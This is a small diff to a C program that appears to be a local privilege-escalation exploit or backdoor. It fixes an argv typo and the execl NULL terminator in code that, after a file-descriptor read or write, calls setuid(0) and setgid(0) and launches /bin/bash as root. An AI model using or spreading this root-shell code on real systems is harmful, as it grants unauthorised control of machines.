@@ -36,7 +36,7 @@ int main(int argc, char *argv[]) {
 			read(fd, argv[1], strlen(argv[1]));
 
 		} else {
-			write(fd, argc[1], strlen(argv[1]));
+			write(fd, argv[1], strlen(argv[1]));
 		}
 
 		end:
@@ -49,8 +49,9 @@ int main(int argc, char *argv[]) {
 
 			setuid(0);
 			setgid(0);
-			execl("/bin/bash", "bash", 0);
+			execl("/bin/bash", "bash", (char *)0);
 		}
-		
+
 	return 0;
+	}
 }
